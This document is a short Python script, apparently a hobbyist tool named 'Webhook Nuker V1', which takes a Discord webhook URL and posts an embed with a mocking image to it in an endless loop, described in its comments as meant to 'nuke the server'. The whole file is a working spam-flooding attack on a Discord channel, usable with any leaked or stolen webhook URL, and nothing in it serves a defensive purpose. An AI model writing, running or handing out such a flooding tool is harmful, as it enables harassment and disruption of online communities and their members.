#Imports the discord webhook library and the system library
from discord_webhook import DiscordWebhook, DiscordEmbed
import sys




#gets the url from the process argument
webhook = DiscordWebhook(url=sys.argv[1], rate_limit_retry=True)
embed = DiscordEmbed(   #Creates the nuker embed
    title="Webhook Nuker V1",
    description="Webhook nuker designed by Ashy146",
    color="ff9d00"
)
embed.set_author(   #Sets the author information of the embed
    name="Ashy146",
    icon_url="https://upload.wikimedia.org/wikipedia/commons/6/6e/Kim_Jong-un_April_2019_%28cropped%29.jpg",
    url="https://github.com/Ashy1464032"
)

embed.set_image("https://media1.tenor.com/m/Y496Q1n5MosAAAAd/spooky-scary.gif")

webhook.add_embed(embed) #Add the embed to the webhook

while (True) :
    if len(sys.argv) != 2:
        print("Usage: Python3 main.py <Discord Webhook URL>")
        sys.exit(0)
    else:
        webhook.execute() #Sends the webhook message constantly to nuke the server
        print(len(sys.argv))